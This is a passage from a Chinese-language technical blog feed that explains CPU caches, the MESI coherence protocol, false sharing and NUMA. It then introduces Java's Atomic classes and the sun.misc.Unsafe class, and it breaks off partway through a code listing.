Core共享的，其实最早的L3 Cache被应用在AMD发布的K6-III处理器上，当时的L3 Cache受限于制造工艺，并没有被集成到CPU内部，而是集成到主板上。</p><p>&nbsp; &nbsp;从Intel Sandy Bridge CPU架构图中可以看出，CPU如果要访问内存中的数据，则要经过L1、L2、L3这三道关卡后才能抵达目的地，这个过程并不是「皇上」(CPU)亲自出马，而是交由3个级别的贵妃(Cache)们层层转发「圣旨」(内部指令)，最红抵达「后宫」(内存).</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/srqxnc_1.png" alt="1565571049876"></p><hr><h3 id="多核CPU与内存共享的问题"><a href="#多核CPU与内存共享的问题" class="headerlink" title="多核CPU与内存共享的问题"></a>多核CPU与内存共享的问题</h3><p>&nbsp; &nbsp;在多核CPU的情况下，如何共享内存？</p><p>&nbsp; &nbsp;如果擅长多线程高级编程，那么肯定会毫不犹豫地给出以下伪代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span>(memory)&#123;</span><br><span class="line">    doSomething(...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&nbsp; &nbsp;如果真这个简单，那么这个世界上就不会只剩下两家独大的主流CPU制造商了，而且可怜的AMD一直被Intel「吊打」。</p><p>&nbsp; &nbsp;多核CPU共享内存的问题也被称为Cache一致性问题，简单地说，就是多个CPU核心所看到的Cache数据应该是一直的，在某个数据被某个CPU写入自己的Cache(L1 Cache)以后，其他CPU都应该能看到相同的Cache数据；如果自己的Cache中有旧数据，则抛弃旧数据。考虑到每个CPU有自己内存独占的Cache，所以这个问题与分布式Cache保持同步的问题是同一类问题。来自Intel的MESI协议是目前业界公认的Cache一致性问题的最佳方案，大多数SMP架构都采用这一方案，虽然该协议是一个CPU内部的协议，但由于它对我们理解内存模型及解决分布式系统的数据一致性问题有重要的参考价值，所以在这对其进行简单介绍。</p><p>&nbsp; &nbsp;Cache Line，如果有印象的话，则你会发现I/O操作从来不以字节为单位，而是以「块」为单位，这里有两个原因：首先，因为I/O操作比较慢，所以读一个字节与一个读连续N个字节所花费的时间基本相同；其次，数据访问往往具有空间连续性地特征，即我们通常会访问空间上连续的一些数据。举个例子，访问数组时通常会循环遍历，比如查找某个值或者进行比较等，如果把数组中连续的几个字节都读到内存中，那么CPU的处理速度会提升几倍。对于CPU来说，由于Memory也是慢速的外部组件，所以针对Memory的读写也采用类似I/O块的方式就不足为奇了。实际上，CPU Cache里的最小存储单元就是Cache Line，Intel CPU的一个Cache Line存储64个字节，每一级Cache都被划分为很多组Cache Line，典型的情况是4条Cache Line为一组，当Cache从Memory中加载数据时，一次加载一条Cache Line的数据。下图是Cache的结构。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/srqxnc_2.png" alt="1565572262318"></p><p>&nbsp; &nbsp;每个Cache Line的头部有两个Bit来表示自身的状态，总共4种状态。</p><blockquote><ul><li>M（Modified）：修改状态，其他CPU上没有数据的副本，并且在本CPU上被修改过，与存储器中的数据不一致，最终必然会引发系统总线的写指令，将Cache Line的数据写回到Memory中。</li><li>E(Exclusive)：独占状态，表示当前Cache Line中包含的数据与Memory中的数据一致，此外，其他CPU中没有数据的副本。</li><li>S（Shared）：共享状态，表示Cache Line中包含的数据与Memory中的数据一致，而且在当前CPU和至少在其他某个CPU中有副本。</li><li>I(Invalid)：无效状态，当前Cache Line中没有有效数据或该Cache Line的数据已经失效，不能再用，当Cache要加载新数据时，优先选择此状态的Cache Line，此外，Cache Line的初始状态也是I状态。</li></ul></blockquote><p>&nbsp; &nbsp;MESI协议是用Cache Line的上述4种状态命名的，对Cache的读写操作引发了Cache Line的状态变化，因而可以理解为一种状态机模型。但MESI的复杂和独特之处在于状态的两种视角：一种是当前读写操作(Local Read/Write)所在CPU看到的自身的Cache Line状态及其他CPU上对应的Cache Line状态；另一种是一个CPU上的Cache Line状态的变迁会导致其他CPU上对应的Cache Line的状态变迁。如下所示为MESI协议的状态图。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/srqxnc_3.png" alt="1565573021589"></p><p>&nbsp; &nbsp;结合状态图，我们深入分析MESI协议的一些实现细节。</p><p>&nbsp; &nbsp;（1）某个CPU(CPU A)发起本地读请求(Local Read)，比如读取某个内存地址的变量，如果此时所有的CPU的Cache中都没有加载此内存地址，即此内存地址对应的Cache Line为无效状态(Invalid)，则CPU A中的Cache会发起一个到Memory的内存Load指令，在相应的Cache Line中完成内存加载后，此Cache Line的状态会被标记位Exclusive。接下来，如果其他CPU(CPU B)在总线上也发起对同一个内存地址的读请求，则这个读请求会被CPU A 嗅探到(SNOOP),然后CPU A在内存总线上复制一份Cache Line作为应答，并将自身的Cache Line状态改为Shared，同时CPU B收到来自总线的应答并保存到自己的Cache里，也修改对应的Cache Line 状态为Shared。</p><p>&nbsp; &nbsp;(2)某个CPU(CPU A)发起本地写请求(Loacl Write),比如对某个内存地址的变量赋值，如果此时多有的CPU的Cache中都没加载此内存地址，即此内存对应的Cache Line为无效状态(Invalid)，则CPU A 中的Cache Line保存了最新的内存变量值后，其祖航太修改为Modified。随后，如果CPU B发起对同一个变量的读操作(Remote Read)，则CPU A在总线嗅探到这个读请求以后，先将Cache Line里修改过的数据回写(Write Back)到Memory中，然后在内存总线上复制一份Cache Line作为应答，最后将自身的Cache Line状态修改为Shared，由此产生的结果是CPU A与CPU B里对应的Cache Line状态都为Shared。</p><p>&nbsp; &nbsp;(3)以上面第二条内容为基础，CPU A发起本地写请求并导致自身的Cache Line状态变为Modified，如果此时CPU B 发起同一个内存地址的写请求(Remote Write)，则我们看到的状态图里此时CPU A 的Cache Line状态为Invalid 其原因如下。</p><p>&nbsp; &nbsp;CPU B此时发出的是一个特殊的请求——读并且打算修改数据，当CPU A从总线上嗅探到这个请求后，会先阻止此请求并取得总线的控制权( Takes Control of Bus)，随后将Cache Line里修改过的数据回写到Memory中，再将此Cache Line的状态修改为Invalid(这是因为其他CPU要改数据，所以没必要改为Shared)。与此同时，CPU B 发现之前的请求并没有得到响应，于是重新发起一次请求，此时由于所有的CPU的Cache里都没有内存副本了，所以CPU B的Cache就从Memory中加载最新的数据到Cache Line中，随后修改数据，然后改变Cache Line的状态为Modified。</p><p>  &nbsp; &nbsp;(4)如果内存中的某个变量被多个CPU加载到各自的Cache中，从而使得变量对应的Cache Line状态为Shared，若此时某个CPU打算对此变量进行写操作，则会导致所有拥有此变量缓存的CPU的Cache Line状态都变为Invalid，这是引发性能下降的一个典型Cache Miss 问题。</p><p>  &nbsp; &nbsp;在理解了MESI协议以后，我们明白了一个重要的事实，即存在多个处理器时，对共享变量的修改操作会设计多个CPU之间协调问题及Cache失效问题，这就引发了著名的「Cache伪共享」问题。</p><p>   &nbsp; &nbsp;如果要访问的数据不在CPU的运算单元里，则需要从缓存中加载，如果缓存中恰好有此数据而且数据有效，就命中一次(Cache Hit)，反之产生一次Cache Miss ，此时需要从下一级缓存或主存中再次尝试加载。根据之前的分析，如果发生了Cache Miss，则数据的访问性能瞬间下降很多！在我们需要大量加载运算的情况下，数据结构、访问方式及程序运算方面是否符合「缓存友好」的设计，就成为「量变引起质变」得关键性因素了。这也是为什么最近，国外很多大数据领域的专家都热衷于研究设计和采用新一代的数据结构和算法，而其核心之一就是「缓存友好」。</p><hr><h3 id="著名的Cache伪共享问题"><a href="#著名的Cache伪共享问题" class="headerlink" title="著名的Cache伪共享问题"></a>著名的Cache伪共享问题</h3><p>&nbsp; &nbsp;Cache伪共享问题是编程中真实存在的一个问题，考虑如下所示的Java Class结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObject</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> a;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> b;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> &nbsp; &nbsp; 按照java规范,MyObject的对象是在堆内存上分配空间存储的，而且a、b、c三个属性在内存空间上是邻近，如下所示。</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>a(8个字节)</td><td>b（8个字节）</td><td>c(8个字节)</td></tr></tbody></table><p> &nbsp; &nbsp;我们知道，X86的CPU中Cache Line的长度为64字节，这也就意味着MyObject的3个属性(长度之和为24字节)是完全可能加载在一个Cache Line里的。如此一来，如果我们有两个不同的线程(分别运行在两个CPU上)分别同时独立修改a与b这两个属性，那么这两个CPU上的Cache Line可能出现如下所示的情况，即a与b这两个变量被放入同一个Cache Line里，并且被两个不同的CPU共享。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/srqxnc_4.png" alt="1566381303626"></p><p>&nbsp; &nbsp;根据上节中MESI协议的相关知识，我们知道，如果Thread 0要对a变量进行修改，则因为CPU 1 上有对应的Cache Line ， 这会导致CPU 1 的Cache Line 无效，从而使得Thread 1 被迫重新从Memory里获取b的内容(b并没有被其他CPU改变，这样做是因为b与a在一个Cache Line里)。同样，如果Thread 1 要对b变量进行修改，则同样导致Thread 0 的Cache Line 失效，不得不重新从Memory里加载a。如此一来，本来是逻辑上无关的两个线程，完全可以在两个不同的CPU上同时执行，但阴差阳错地共享了同一个Cache Line 并相互抢占资源，导致并形成为串行，大大降低了系统的并发性，这就是所谓的Cache伪共享。</p><p>&nbsp; &nbsp;解决Cache伪共享问题的方法很简单，将a与b两个变量分到不同的Cache Line里，通常可以用一些无用的字段填充a与b之间的空隙。由于伪共享问题对性能的影响比较大，所以JDK 8 首次提供了正式的普适性的方案，即采用@Contended注解来确保一个Object或者Class里的某个属性与其他属性不在一个Cache Line里，下面的VolatileLong的多个实例之间就不会产生Cache伪共享的问题：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Contended</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VolatileLong</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">volatile</span> <span class="keyword">long</span> value = <span class="number">0L</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="深入理解不一致性内存"><a href="#深入理解不一致性内存" class="headerlink" title="深入理解不一致性内存"></a>深入理解不一致性内存</h3><p>&nbsp; &nbsp;MESI协议解决了多核CPU下的Cache一致性问题，因而成为SMP架构的唯一选择。SMP架构近几年迅速在PC领域(X86)发展，一个CPU芯片上集成的CPU核心数量越来越多，到2017年，AMD的ZEN系列处理器就已经达到16核心32线程了。SMP架构是一种平行的结果，所有CPU Core都连接到一个内存总线上，他们平等访问内存，同时整个内存是统一结构、统一寻址的(Uniform Memory Architecture , UMA)。如下所示给出了SMP架构的示意图。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/srqxnc_5.png" alt="1566382149967"></p><p>&nbsp; &nbsp;但是，随着CPU核心数量的不断增长，SMP架构也暴露其天生的短板，其根本瓶颈是共享内存总线的宽带无法满足CPU数量的增加，同时，一条「马路」上同行的「车」多了，难免陷入「拥堵模式」。在这种情况下，分布式解决方案应运而生，系统的内存与CPU进行分割并绑定在一起，形成多个独立的子系统，这些子系统之间高速互连，这就是所谓的NUMA（None Uniform Memory Architecture）架构，如下图所示：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/srqxnc_6.png" alt="1566382356771"></p><p>&nbsp; &nbsp;我们可以认为NUMA架构第1次打破了「大锅饭」的模式，内存不在是一个整体，而是被分割为互相独立的几块，被不同的CPU私有化(Attach到不同的CPU上)。因此，当CPU访问自身私有的内存地址时（Local Access），会很快得到响应，而如果需要访问其他CPU控制的内存数据（Remote Access），则需要通过某种互连通道（Inter-connect通道）访问，响应时间与之前相对变慢。NUMA的主要优点是伸缩性，NUMA的这种体系结构在设计上已经超越了SMP，可以扩展到几百个CPU而不会导致性能的严重下降。</p><p>&nbsp; &nbsp;NUMA技术最早出现出现在20世纪80年代，主要运行在一些大中型UNIX系统中，Sequent公司是世界公认的NUMA技术领袖。早在1986年，Sequent公司就率先利用微处理器构建大型系统，开发了基于UNIX的SMP体系结构，开创了业界转入SMP领域的先河。1999年9月，IBM公司收购了Sequent公司，将NUMA技术集成到IBM UNIX阵营中，并推出了能够支持和扩展Intel平台的NUMA-Q系统及方案，为全球大型企业客户适应高速发展的电子商务市场提供了更加多样化、高可扩展性及易于管理的选择，成为NUMA技术的领先开发者与革新者。随后很多老牌UNIX服务器厂商也采用了NUMA技术，例如IBM、Sun、惠普、Unisys、SGI等公司。2000年全球互联网泡沫破灭后，X86+Linux系统开始以低廉的成本侵占UNIX的底盘，AMD率先在其AMD Opteron 系列处理器中的X86 CPU上实现了NUMA架构，Intel也跟进并在Intel Nehalem中实现了NUMA架构（Intel服务器芯片志强E5500以上的CPU和桌面的i3、i5、i7均采用此架构），至此NUMA这个贵族技术开始真正走入平常百姓家。</p><p>&nbsp; &nbsp;下面详细分析一下NUMA技术的特点。首先，NUMA架构中引入了一个重要的新名词——Node，一个Node由一个或者多个Socket组成，即物理上的一个或多个CPU芯片组成一个逻辑上的Node。如下所示为来自Dell PowerEdge系统服务器的说明手册中的NUMA的图片，4个Intel Xeon E 5-4600处理器形成4个独立的NUMA Node，由于每个Intel Xeon E 5-4600为8Core，支持双线程，所以每个Node里的Logic CPU数量为16个，占每个Node分配系统总内存1/4，每个Node之间通过Intel QPI（QuickPath Interconnect）技术形成了点到点的全互连处理器系统。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/srqxnc_7.png" alt="1566383334597"></p><p>&nbsp; &nbsp;其次，我们看到NUMA这种基于点到点的全互连处理器系统与传统的基于共享总线的处理器系统的SMP还是有巨大差异的。在这种情况下无法通过嗅探总线的方式来实现Cache一致性，因此为了实现NUMA架构下的Cache一致性，Intel引入了MESI协议的一个扩展写协议——MESIF。MESIF采用了一种基于目录表的实现方案，该协议由Boxboro-EX处理器系统实现，但独立研究MESIF协议并没有太大的意义，因为目前Intel并没有公开Boxbore-EX处理器系统的详细设计文档。</p><p>&nbsp; &nbsp;最后，我们说说NUMA架构的当前困境与我们对未来的展望。</p><p>&nbsp; &nbsp;NUMA架构由于打破了传统的「全局内存」概念，目前在编程语言方面还没有任何一种语言从内存模型上支持它，所以当前很难开发适应NUMA的软件。但这方面已经有很多尝试和进展了。Java在支持NUMA的系统里，可以开启基于NUMA的内存分配方案，使得当前线程所需要的内存从对应的Node上分配，从而大大加快对象的创建过程。在大数据领域，NUMA系统正在发挥着越来越强的作用，SAP的高端大数据系统HANA被SGI在其UV NUMA Systems上实现了良好的水平扩展。据说微软将会把SQL Server引入到Linux上，如此一来，很多潜在客户将有机会在SGI提供的大型NUMA机器上高速运行多个SQL Server实例。在云计算与虚拟化方面。OpenStack与VMware已经支持基于NUMA技术的虚机分配能力，使得不同的虚机运行在不同的Core上，同时虚机的内存不会跨越多个NUMA Node。</p><p>&nbsp; &nbsp;NUMA技术也会推进基于多进程的高性能单机分布式系统的发展，即在4个Socket、每个Socket为16Core的强大机器里，只要启动4个进程，通过NUMA技术将每个进程绑定到一个Socket上，并保证每个进程只访问不超过Node本地的内存，即可让系统进行最高性能的并发，而进程间的通信通过高性能进程间的通信技术实现即可。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 内存 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>并发编程之Atomic&amp;Unsafe魔法类详解</title>
      <link href="/UNSAFE%E5%92%8CJava-%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/"/>
      <url>/UNSAFE%E5%92%8CJava-%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/</url>
      
        <content type="html"><![CDATA[<p>并发编程之Atomic&amp;Unsafe魔法类详解</p><a id="more"></a><h1 id="并发编程之Atomic-amp-Unsafe魔法类详解"><a href="#并发编程之Atomic-amp-Unsafe魔法类详解" class="headerlink" title="并发编程之Atomic&amp;Unsafe魔法类详解"></a><a href="https://yccjack.github.io/2020/05/28/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E4%B9%8BAtomic&Unsafe%E9%AD%94%E6%B3%95%E7%B1%BB%E8%AF%A6%E8%A7%A3/">并发编程之Atomic&amp;Unsafe魔法类详解</a></h1><h1 id="并发编程之Atomic-amp-Unsafe魔法类详解-1"><a href="#并发编程之Atomic-amp-Unsafe魔法类详解-1" class="headerlink" title="并发编程之Atomic&amp;Unsafe魔法类详解"></a>并发编程之Atomic&amp;Unsafe魔法类详解</h1><h2 id="一、什么是原子操作？"><a href="#一、什么是原子操作？" class="headerlink" title="一、什么是原子操作？"></a>一、什么是原子操作？</h2><p>原子（atom）本意是“不能被进一步分割的最小粒子”，而原子操作（atomic operation）意为”不可被中断的一个或一系列操作”。在多处理器上实现原子操作就变得有点复杂。本文让我们一起来聊一聊在Inter处理器和Java里是如何实现原子操作的。</p><p><strong>1、相关术语</strong></p><table><thead><tr><th>术语名称</th><th>英文</th></tr></thead><tbody><tr><td>缓存行</td><td>Cache line</td></tr><tr><td>比较并交换</td><td>Compare and Swap</td></tr><tr><td>CPU流水线</td><td>CPU pipeline</td></tr><tr><td>内存顺序冲突</td><td>Memory order violation</td></tr></tbody></table><h2 id="二、CPU原子操作的实现方式"><a href="#二、CPU原子操作的实现方式" class="headerlink" title="二、CPU原子操作的实现方式"></a>二、CPU原子操作的实现方式</h2><p>32位IA-32处理器使用基于对缓存加锁或总线加锁的方式来实现多处理器之间的原子操作。</p><p><strong>1、处理器自动保证基本内存操作的原子性</strong></p><p>首先处理器会自动保证基本的内存操作的原子性。处理器保证从系统内存当中读取或者写入一个字节是原子的，意思是当一个处理器读取一个字节时，其他处理器不能访问这个字 节的内存地址。奔腾6和最新的处理器能自动保证单处理器对同一个缓存行里进行16/32/64位的操作是原子的，但是复杂的内存操作处理器不能自动保证其原子性，比如跨总线宽度， 跨多个缓存行，跨页表的访问。但是处理器提供总线锁定和缓存锁定两个机制来保证复杂内存操作的原子性。</p><p><strong>2、使用总线锁保证原子性</strong></p><p>第一个机制是通过总线锁保证原子性。如果多个处理器同时对共享变量进行读改写（i++就是经典的读改写操作）操作，那么共享变量就会被多个处理器同时进行操作，这样读改写操作就不是原子的，操作完之后共享变量的值会和期望的不一致，举个例子：如果i=1,我们进行两次i++操作，我们期望的结果是3，但是有可能结果是2。</p><p>如下图</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190816141731.png" alt="img"></p><p>原因是有可能多个处理器同时从各自的缓存中读取变量i，分别进行加一操作，然后分别写入系统内存当中。那么想要保证读改写共享变量的操作是原子的，就必须保证CPU1读 改写共享变量的时候，CPU2不能操作缓存了该共享变量内存地址的缓存。</p><p><em>处理器使用总线锁就是来解决这个问题的</em>。所谓总线锁就是使用处理器提供的一个LOCK＃信号，当一个处理器在总线上输出此信号时，其他处理器的请求将被阻塞住,那么该 处理器可以独占使用共享内存。</p><p><strong>3、使用缓存锁保证原子性</strong></p><p>第二个机制是通过缓存锁定保证原子性。在同一时刻我们只需保证对某个内存地址的操作是原子性即可，但总线锁定把CPU和内存之间通信锁住了，这使得锁定期间，其他处理器不能操作其他内存地址的数据，所以总线锁定的开销比较大，最近的处理器在某些场合下使用缓存锁定代替总线锁定来进行优化。</p><p>频繁使用的内存会缓存在处理器的L1，L2和L3高速缓存里，那么原子操作就可以直接在处理器内部缓存中进行，并不需要声明总线锁，在奔腾6和最近的处理器中可以使用“缓存锁定”的方式来实现复杂的原子性。所谓“缓存锁定”就是如果缓存在处理器缓存行中内存区域在LOCK操作期间被锁定，当它执行锁操作回写内存时，处理器不在总线上声言LOCK＃信号，而是修改内部的内存地址，并允许它的缓存一致性机制来保证操作的原子性，因为缓存一致性机制会阻止同时修改被两个以上处理器缓存的内存区域数据，当其他处理器回写已被锁定的缓存行的数据时会起缓存行无效，在例1中，当CPU1修改缓存行中的i时使用缓存锁定，那么CPU2就不能同时缓存了i的缓存行。</p><p><em>但是有两种情况下处理器不会使用缓存锁定</em>。第一种情况是：当操作的数据不能被缓存在处理器内部，或操作的数据跨多个缓存行（cache line），则处理器会调用总线锁定。第二种情况是：有些处理器不支持缓存锁定。对于Inter486和奔腾处理器,就算锁定的内存区域在处理器的缓存行中也会调用总线锁定。</p><p>以上两个机制我们可以通过Inter处理器提供了很多LOCK前缀的指令来实现。比如位测试和修改指令BTS，BTR，BTC，交换指令XADD，CMPXCHG和其他一些操作数和逻辑指令，比如ADD（加），OR（或）等，被这些指令操作的内存区域就会加锁，导致其他处理器不能同时访问它。</p><p><strong>4、Java当中如何实现原子操作</strong></p><p>在java中可以通过锁和循环CAS的方式来实现原子操作。</p><p>JVM中的CAS操作正是利用了上文中提到的处理器提供的CMPXCHG指令实现的。自旋CAS实现的基本思路就是循环进行CAS操作直到成功为止，具体的类可以参见juc下的atomic包内的原子类。</p><h2 id="三、Atomic"><a href="#三、Atomic" class="headerlink" title="三、Atomic"></a>三、Atomic</h2><p>在Atomic包里一共有12个类，四种原子更新方式，分别是原子更新基本类型，原子更新数组，原子更新引用和原子更新字段。Atomic包里的类基本都是使用Unsafe实现的包装类。</p><ul><li>基本类：AtomicInteger、AtomicLong、AtomicBoolean；</li><li>引用类型：AtomicReference、AtomicReference的ABA实例、AtomicStampedRerence、AtomicMarkableReference；</li><li>数组类型：AtomicIntegerArray、AtomicLongArray、AtomicReferenceArray；</li><li>属性原子修改器（Updater）：AtomicIntegerFieldUpdater、AtomicLongFieldUpdater、AtomicReferenceFieldUpdater；</li></ul><p><strong>1、原子更新基本类型类</strong></p><p>用于通过原子的方式更新基本类型，Atomic包提供了以下三个类：</p><ul><li>AtomicBoolean：原子更新布尔类型。</li><li>AtomicInteger：原子更新整型。</li><li>AtomicLong：原子更新长整型。</li></ul><p>AtomicInteger的常用方法如下：</p><ul><li>int addAndGet(int delta)：以原子方式将输入的数值与实例中的值（AtomicInteger里的value）相加，并返回结果</li><li>boolean compareAndSet(int expect,int update)：如果输入的数值等于预期值，则以原子方式将该值设置为输入的值。</li><li>int getAndIncrement()：以原子方式将当前值加1，注意：这里返回的是自增前的值。</li><li>void lazySet(int newValue)：最终会设置成newValue，使用lazySet设置值后，可能导致其他线程在之后的一小段时间内还是可以读到旧的值。</li><li>int getAndSet(int newValue)：以原子方式设置为newValue的值，并返回旧值。</li></ul><p>Atomic包提供了三种基本类型的原子更新，但是Java的基本类型里还有char，float和double等。那么问题来了，如何原子的更新其他的基本类型呢？Atomic包里的类基本都是 使用Unsafe实现的，Unsafe只提供了三种CAS方法，compareAndSwapObject，compareAndSwapInt和compareAndSwapLong，再看AtomicBoolean源码，发现其是 先把Boolean转换成整型，再使用compareAndSwapInt进行CAS，所以原子更新double也可以用类似的思路来实现。</p><p><strong>2、原子更新数组类</strong></p><p>通过原子的方式更新数组里的某个元素，Atomic包提供了以下三个类：</p><ul><li>AtomicIntegerArray：原子更新整型数组里的元素。</li><li>AtomicLongArray：原子更新长整型数组里的元素。</li><li>AtomicReferenceArray：原子更新引用类型数组里的元素。</li><li>AtomicIntegerArray类主要是提供原子的方式更新数组里的整型，</li></ul><p>其常用方法如下</p><ul><li>int addAndGet(int i, int delta)：以原子方式将输入值与数组中索引i的元素相加。</li><li>boolean compareAndSet(int i, int expect, int update)：如果当前值等于预期值，则以原子方式将数组位置i的元素设置成update值。</li></ul><p><strong>3、原子更新引用类型</strong></p><p>原子更新基本类型的AtomicInteger，只能更新一个变量，如果要原子的更新多个变量，就需要使用这个原子更新引用类型提供的类。Atomic包提供了以下三个类：</p><ul><li>AtomicReference：原子更新引用类型。</li><li>AtomicReferenceFieldUpdater：原子更新引用类型里的字段。</li><li>AtomicMarkableReference：原子更新带有标记位的引用类型。可以原子的更新一个布尔类型的标记位和引用类型。构造方法是AtomicMarkableReference(V initialRef, boolean initialMark)</li></ul><p><strong>4、原子更新字段类</strong></p><p>如果我们只需要某个类里的某个字段，那么就需要使用原子更新字段类，Atomic包提供了以下三个类：</p><ul><li>AtomicIntegerFieldUpdater：原子更新整型的字段的更新器。</li><li>AtomicLongFieldUpdater：原子更新长整型字段的更新器。</li><li>AtomicStampedReference：原子更新带有版本号的引用类型。该类将整数值与引用关联起来，可用于原子的更数据和数据的版本号，可以解决使用CAS进行原子更新时，可能出现的ABA问题。原子更新字段类都是抽象类，每次使用都时候必须使用静态方法newUpdater创建一个更新器。原子更新类的字段的必须使用public volatile修饰符。</li></ul><h2 id="四、Unsafe魔法类"><a href="#四、Unsafe魔法类" class="headerlink" title="四、Unsafe魔法类"></a>四、Unsafe魔法类</h2><p>Unsafe是位于sun.misc包下的一个类，主要提供一些用于执行低级别、不安全操作的方法，如直接访问系统内存资源、自主管理内存资源等，这些方法在提升Java运行效率、增强Java语言底层资源操作能力方面起到了很大的作用。但由于Unsafe类使Java语言拥有了类似C语言指针一样操作内存空间的能力，这无疑也增加了程序发生相关指针问题的风险。在程序中过度、不正确使用Unsafe类会使得程序出错的概率变大，使得Java这种安全的语言变得不再“安全”，因此对Unsafe的使用一定要慎重。</p><p>Unsafe类为一单例实现，提供静态方法getUnsafe获取Unsafe实例，当且仅当调用getUnsafe方法的类为引导类加载器所加载时才合法，否则抛出SecurityException异常。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">复制</span><br><span class="line">public class Unsafe &#123; &#x2F;&#x2F; 单例对象 </span><br><span class="line">    private static final Unsafe theUnsafe;</span><br><span class="line"></span><br><span class="line">    private Unsafe() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @CallerSensitive</span><br><span class="line">    public static Unsafe getUnsafe() &#123;</span><br><span class="line">        Class var0 &#x3D; Reflection.getCallerClass();</span><br><span class="line">        &#x2F;&#x2F;仅在引导类加载器&#96;BootstrapClassLoader&#96;加载时才合法 </span><br><span class="line">        if (!VM.isSystemDomainLoader(var0.getClassLoader())) &#123;</span><br><span class="line">            throw new SecurityException(&quot;Unsafe&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return theUnsafe;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>1、如何获取Unsafe实例？</strong></p><ul><li>1、从getUnsafe方法的使用限制条件出发，通过Java命令行命令-Xbootclasspath/a把调用Unsafe相关方法的类A所在jar包路径追加到默认的bootstrap路径中，使得A被 引导类加载器加载，从而通过Unsafe.getUnsafe方法安全的获取Unsafe实例。 java ­Xbootclasspath/a:${path} // 其中path为调用Unsafe相关方法的类所在jar包路径</li><li>2、通过反射获取单例对象theUnsafe。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">复制public class UnsafeInstance &#123;</span><br><span class="line">    public static Unsafe reflectGetUnsafe() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Field field &#x3D; Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            return (Unsafe) field.get(null);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2、Unsafe功能介绍</strong></p><p>Unsafe提供的API大致可分为内存操作、CAS、Class相关、对象操作、线程调度、系统信息获取、内存屏障、数组操作等几类，下面将对其相关方法和应用场景进行详细介绍。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190816150855.png" alt="img"></p><ul><li>1、内存操作</li></ul><p>这部分主要包含堆外内存的分配、拷贝、释放、给定地址值操作等方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">复制&#x2F;&#x2F;分配内存, 相当于C++的malloc函数 </span><br><span class="line">public native long allocateMemory(long bytes); </span><br><span class="line">&#x2F;&#x2F;扩充内存 </span><br><span class="line">public native long reallocateMemory(long address, long bytes); </span><br><span class="line">&#x2F;&#x2F;释放内存 </span><br><span class="line">public native void freeMemory(long address);</span><br><span 